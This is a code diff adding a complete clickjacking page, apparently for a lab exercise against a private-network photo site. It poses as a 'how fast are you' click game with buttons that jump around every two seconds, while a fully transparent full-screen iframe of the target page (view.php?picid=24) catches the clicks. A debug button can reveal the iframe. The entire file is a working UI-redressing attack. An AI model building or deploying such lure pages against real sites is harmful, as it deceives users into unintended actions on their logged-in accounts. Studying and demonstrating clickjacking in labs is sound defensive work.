@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+
+<style>
+
+#clickjack {
+  width:100%;
+  height:100%;
+  opacity: 0.0;
+  /*filter: alpha(opacity=0);*/
+  /*z-index: 2;*/
+  position: absolute;
+}
+
+#main {
+  left:auto;
+  align-content: center;
+}
+
+button.main{
+  /*z-index: 1;*/
+  position: absolute;
+  /*background: url(button.png) no-repeat;*/
+  background:  #ED5664; padding: 0.3em 0.5em;
+  font-size:11pt;
+  font-weight: bold;
+}
+
+p.main{
+  position: absolute;
+  top:10%;
+  left: 30%;
+}
+
+#one {
+  top: 21%;
+  left: 60%;
+}
+
+#two {
+  display: none;
+  top: 55%;
+  left: 28%;
+}
+
+#three {
+  display: none;
+  top: 36%;
+  left: 28%;
+}
+
+#four{
+  display: none;
+  z-index: 1;
+  position: absolute;
+  top: 65%;
+  left: 65%;
+
+}
+
+
+body {
+				background:#ffffff;
+        overflow: hidden;
+}
+</style>
+<script>
+
+window.setTimeout(first, 2000);
+
+  function reset(){
+    document.getElementById('one').style.display = "block";
+    document.getElementById('two').style.display = "none";
+    document.getElementById('three').style.display = "none";
+    document.getElementById('four').style.display = "none";
+
+    window.setTimeout(first, 2000);
+  }
+
+  function first(){
+    document.getElementById('two').style.display = "block";
+    document.getElementById('one').style.display = "none";
+    window.setTimeout(second, 2000);
+  }
+
+  function second() {
+    document.getElementById('three').style.display = "block";
+    document.getElementById('two').style.display = "none";
+    window.setTimeout(third, 2000);
+  }
+
+  function third(){
+    document.getElementById('four').style.display = "block";
+    document.getElementById('three').style.display = "none";
+    window.setTimeout(reset, 2000);
+
+  }
+
+</script>
+
+<body>
+<div id ="main">
+  <button id = "one" class="main"> TRY CLICK ME </button>
+  <button id = "two" class="main"> TRY HARDER ! </button>
+  <button id = "three"  class="main"> YOU SUCK </button>
+  <button id = "four"  class="main" onclick="document.getElementById('clickjack').src = 'http://172.16.4.3/pictures/view.php?picid=24';"> LAST ONE </button>
+  <button id = "display"  style="position: absolute; top:95%; left:95%; z-index: 1" onclick="document.getElementById('clickjack').style.opacity = 0.3;"> Display iframe </button>
+
+
+  <p style="font-face:arial; font-size:16pt;" class="main"> <b>How <i>fast</i> are you?! click the buttons as soon as they appear! </b></p>
+  <p style="font-face:arial; font-size=18; left: 40%; top: 15%;" class="main"> Most people can't even click all four! </b></p>
+
+</div>
+
+
+ <iframe id = "clickjack" src="http://172.16.4.3/pictures/view.php?picid=24"> </iframe>
+</body>
+
+
+</html>
